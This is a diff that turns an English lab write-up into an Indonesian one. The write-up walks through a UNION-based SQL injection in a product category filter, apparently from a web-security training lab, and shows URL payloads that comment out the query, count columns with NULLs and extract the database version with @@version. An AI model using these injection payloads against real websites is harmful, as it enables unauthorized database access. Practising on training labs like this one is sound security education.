@@ -1,24 +1,80 @@
+# SQL Injection Attack: Querying the Database Type and Version on MySQL and Microsoft
 
-# 4 - SQL injection attack, querying the database type and version on MySQL and Microsoft
+Lab ini berisi kerentanannya dalam SQL injection pada filter kategori produk. Anda dapat menggunakan serangan UNION untuk mendapatkan hasil dari query yang disuntikkan.
 
-This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+Untuk menyelesaikan lab ini, tampilkan string versi database dengan memastikan database mengembalikan string: '8.0.32-0ubuntu0.20.04.2'.
 
-To solve the lab, display the database version string. (Make the database retrieve the string: '8.0.32-0ubuntu0.20.04.2')
+---
 
----------------------------------------------
+### **Langkah-langkah Melakukan Serangan**
 
-Reference: https://portswigger.net/web-security/sql-injection/cheat-sheet
+#### **Langkah 1: Analisis Struktur Query**
+Dengan menyuntikkan payload berikut:
+```
+/filter?category=Gifts'--
+```
+Aplikasi kemungkinan besar akan menjalankan query seperti ini:
+```sql
+SELECT product_name, description 
+FROM products 
+WHERE category = 'Gifts';
+```
+Query ini mengembalikan dua kolom: `product_name` dan `description`.
 
----------------------------------------------
-/filter?category=Gifts'+order+by+1--+
----------------------------------------------
+#### **Langkah 2: Tentukan Jumlah Kolom**
+Untuk mengetahui jumlah kolom dalam query asli, suntikkan:
+```
+/filter?category=Gifts'+union+all+select+NULL,NULL--+
+```
+Jika tidak ada kesalahan, query tersebut memiliki dua kolom.
 
-/filter?category=Gifts'+union+select NULL,NULL--+
----------------------------------------------
-/filter?category=Gifts'+union+select 'A',NULL--+
----------------------------------------------
-/filter?category=Gifts'+union+select @@version,NULL--+
+#### **Langkah 3: Ekstrak Versi Database**
+Untuk mendapatkan versi database yang sesuai, kita dapat menggunakan perintah SQL yang tepat. Di MySQL dan Microsoft SQL Server, string versi dapat diekstrak menggunakan query berikut:
+```sql
+SELECT @@version;
+```
+Suntikkan payload berikut:
+```
+/filter?category=Gifts'+union+all+select+NULL,@@version--+
+```
 
-``` 
+#### **Langkah 4: Validasi Versi Database**
+Jika server MySQL mengembalikan string versi yang sesuai, seperti:
+```
+8.0.32-0ubuntu0.20.04.2
+```
 
+---
+
+### **Payload yang Valid**
+
+#### **Payload Uji Awal**:
+- Menampilkan 4 item di kategori "Gifts":
+  ```
+  /filter?category=Gifts'--
+  ```
+
+#### **Tentang Penyusunan Kolom**:
+- Tentukan jumlah kolom:
+  ```
+  /filter?category=Gifts'+union+all+select+NULL,NULL--+
+  ```
+
+#### **Menyuntikkan Query Versi Database**:
+- Ambil versi database:
+  ```
+  /filter?category=Gifts'+union+all+select+NULL,@@version--+
+  ```
+
+---
+
+### **Referensi**
+
+- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+---
+
+### **Ilustrasi**
+
+#### **Tampilan Awal (Produk dan Deskripsi)**:
 ![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/1.png)
